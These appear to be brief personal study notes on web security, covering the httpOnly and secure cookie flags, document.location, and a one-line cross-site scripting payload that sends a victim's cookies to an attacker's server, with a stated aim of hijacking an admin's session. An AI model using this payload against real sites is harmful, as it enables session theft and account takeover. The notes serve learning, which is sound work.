# JAN
## 14
### Additional Flags to Prevent Cookie Manipulation
- httpOnly flag
- secure flag

### document.location
- Also window.location - represents the URL of the webpage

### Cookie Stealing Using A Web Server
```javascript
<script>document.location='http://your ip/cookiestealer.php?c='+document.cookie;</script>
```

**Motivation:** Uploading a malicious JS script so that an admin views it and his cookies are sent to my server so that I can hijack his session. <br>
**Note:** All session tokens are cookies but no all cookies are session tokens.
